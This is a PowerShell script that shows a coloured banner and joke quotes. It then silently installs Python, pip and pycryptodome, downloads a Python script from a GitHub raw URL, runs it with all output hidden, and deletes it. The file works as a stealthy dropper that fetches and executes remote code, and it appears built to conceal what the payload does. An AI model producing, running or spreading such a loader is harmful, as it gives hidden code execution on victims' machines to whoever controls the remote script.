$ErrorActionPreference = 'SilentlyContinue'

function Show-Banner {
    $banner = @"
.__                                 .___                     
|  |   ____   ____ ______ ___.__. __| _/_______  _____  __   
|  |  /  _ \ /  _ \\____ <   |  |/ __ |/ __ \  \/ /\  \/ /   
|  |_(  <_> |  <_> )  |_> >___  / /_/ \  ___/\   /  \   /    
|____/\____/ \____/|   __// ____\____ |\___  >\_/    \_/_____
                   |__|   \/         \/    \/         /_____/
"@

    $colors = @('Red','DarkRed','Magenta','DarkMagenta','Blue','DarkBlue','Cyan','DarkCyan')
    $lines = $banner -split "`n"
    for ($i = 0; $i -lt $lines.Length; $i++) {
        $color = $colors[$i % $colors.Length]
        Write-Host $lines[$i] -ForegroundColor $color
        Start-Sleep -Milliseconds 100
    }
}

function Show-Quote {
    $quotes = @(
        "Guess what, chicken butt!",
        "Evann has a long ass nose, good GOD",
        "dude, what the fuck!!!!!!",
        "deadly but silent, liek a fart XDDDDD",
        "If this breaks, blame the raccoons XDDDDDDD"
    )
    $quote = Get-Random -InputObject $quotes
    Write-Host "`n$quote" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

Show-Banner
Show-Quote

# --- Ensure Python is installed ---
if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    $pythonInstaller = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile $pythonInstaller -UseBasicParsing | Out-Null
    Start-Process $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
    Remove-Item $pythonInstaller -Force

    # Refresh PATH so current session can see python
    $env:PATH = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

# --- Ensure pip is installed ---
if (-not (Get-Command pip -ErrorAction SilentlyContinue)) {
    $getPip = "$env:TEMP\get-pip.py"
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -UseBasicParsing | Out-Null
    python $getPip *> $null
    Remove-Item $getPip -Force
}

# --- Install dependency silently ---
python -m pip install --upgrade pip *> $null
python -m pip install pycryptodome *> $null

# --- Download + run your script silently ---
$scriptUrl = "https://raw.githubusercontent.com/loopydevv-commits/loopysTestThing/main/main.py" 
$scriptPath = "$env:TEMP\downloaded_script.py"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing | Out-Null
python $scriptPath *> $null
Remove-Item $scriptPath -Force

